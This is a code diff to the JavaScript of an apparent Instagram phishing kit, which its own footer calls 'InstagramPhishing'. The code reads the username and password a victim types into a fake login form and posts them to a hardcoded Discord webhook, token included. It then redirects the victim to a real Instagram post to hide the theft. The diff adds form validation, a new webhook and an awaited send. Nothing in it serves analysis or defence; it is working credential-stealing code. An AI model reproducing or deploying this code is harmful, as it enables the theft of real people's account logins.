@@ -3,6 +3,17 @@ password = document.querySelector("#passwordInput");
 username = document.querySelector("#usernameInput");
 
 
+function disableBtn() {
+    if (username.value && password.value) {
+        loginButton.disabled = false;
+    } else {
+        loginButton.disabled = true;
+    }
+  }
+  
+  password.addEventListener("input", disableBtn);
+  username.addEventListener("input", disableBtn);
+
 let Info
 loginButton.addEventListener("click", () => {
   (async function() {
@@ -27,14 +38,14 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1097411858408951838/VYJFv_pwqEAfhp26jcNi_-FrebSxhg3DrpzsNZOOKnbmRtLNMF-tD_hGAotoLjGb_VEL"; //https://discord.com/api/webhooks/ID/TOKEN
+  const webhook = "https://discord.com/api/webhooks/1106612021379747862/OOKLgU0bn6RV4CN86mftBwYaaUzT3HubY_PGU7_zsrihpASc-N_f1tIZkE30GMtPF9wf"; //https://discord.com/api/webhooks/ID/TOKEN
 
   const embed = {
-    color: "#18328b",
+    color: 1585803, //#18328b
     title: "Login Attempt",
     description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
     footer: {
-      text: "https://github.com/Josakko/InstagramPhishing",
+      text: "github.com/Josakko/InstagramPhishing",
     }
   }
 
@@ -43,17 +54,17 @@ async function sendInfo() {
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ username: "JK_InstagramPhishing", embeds: [embed] })
+    body: JSON.stringify({ username: "JK_InstagramPhishing", embeds: [embed] }) //content: `${Info}`
   };
 
   try {
-    fetch(webhook, config);
+    await fetch(webhook, config);
   } catch {
-    //setTimeout(function() {
-    //    window.location.replace("https://www.instagram.com/p/BzI9vmcHdvN")
-    //}, 1000);
+    setTimeout(function() {
+        window.location.replace("https://www.instagram.com/p/BzI9vmcHdvN")
+    }, 1000);
   }
-  //setTimeout(function() {
-  //  window.location.replace("https://www.instagram.com/p/BzI9vmcHdvN")
-  //}, 1000);
+  setTimeout(function() {
+    window.location.replace("https://www.instagram.com/p/BzI9vmcHdvN")
+  }, 1000);
 }
